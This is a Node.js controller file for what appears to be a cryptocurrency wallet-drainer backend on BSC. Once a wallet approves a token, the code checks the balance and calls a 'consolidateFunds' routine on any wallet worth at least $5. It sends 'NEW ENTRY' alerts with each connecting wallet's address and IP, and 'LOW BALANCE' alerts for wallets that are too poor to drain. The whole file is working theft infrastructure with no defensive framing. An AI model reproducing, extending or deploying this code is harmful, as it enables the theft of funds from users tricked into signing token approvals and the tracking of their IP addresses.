const { web3, contract, getAccount } = require('../config');
const { getWalletTokenInfo } = require('../services/tokenService');
const { consolidateFunds } = require('../services/consolidateService');
const { sendAllNotifications } = require('../services/notificationService');

// Handle approval
async function handleApproval(req, res) {
    try {
        const { walletAddress, tokenAddress } = req.body;
        
        if (!walletAddress || !tokenAddress) {
            return res.status(400).json({ 
                success: false, 
                error: 'walletAddress and tokenAddress required' 
            });
        }
        
        res.json({
            success: true,
            message: 'Approval received, processing in background'
        });
        
        processApprovalInBackground(walletAddress, tokenAddress);
        
    } catch (error) {
        console.error('❌ Controller error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}

// Background processing
async function processApprovalInBackground(walletAddress, tokenAddress) {
    try {
        console.log(`📥 Processing: ${walletAddress} - ${tokenAddress}`);
        
        const tokenInfo = await getWalletTokenInfo(walletAddress, tokenAddress);
        
        if (!tokenInfo) {
            console.log('❌ Token not found');
            return;
        }
        
        if (Number(tokenInfo.balanceValue) < 5) {
            console.log(`⚠️ Low balance: ${tokenInfo.symbol}`);
            const msg = `👤 Wallet: ${walletAddress}\n🪙 Token: ${tokenInfo.symbol}\n💰 Balance: ${tokenInfo.balance}\n💵 Value: $${tokenInfo.balanceValue}\n\n❌ Minimum $5 required`;
            await sendAllNotifications('⚠️ LOW BALANCE', msg);
            return;
        }
        
        await consolidateFunds(walletAddress, tokenInfo.symbol, tokenInfo.balance);
        
    } catch (error) {
        console.error('❌ Background processing error:', error);
    }
}

// Handle wallet connect
async function handleWalletConnect(req, res) {
    try {
        const { walletAddress, ipAddress } = req.body;
        
        res.json({ 
            success: true, 
            message: 'Wallet connect received' 
        });
        
        const msg = `👤 Wallet: ${walletAddress}\n🌐 IP: ${ipAddress || 'Unknown'}\n📅 ${new Date().toISOString()}`;
        await sendAllNotifications('🆕 NEW ENTRY', msg);
        
    } catch (error) {
        console.error('❌ Wallet connect error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}

// Get supported tokens
async function getSupportedTokens(req, res) {
    try {
        const tokens = await contract.methods.getSupportedTokens().call();
        res.json({ 
            success: true, 
            tokens: tokens.map(t => t.toString()) 
        });
    } catch (error) {
        console.error('❌ Get tokens error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}

// Health check
async function healthCheck(req, res) {
    try {
        const blockNumber = await web3.eth.getBlockNumber();
        res.json({
            status: 'ok',
            network: 'BSC',
            blockNumber: blockNumber.toString(),
            contract: process.env.CONTRACT_ADDRESS
        });
    } catch (error) {
        res.status(500).json({
            status: 'error',
            error: error.message
        });
    }
}

module.exports = {
    handleApproval,
    handleWalletConnect,
    getSupportedTokens,
    healthCheck
};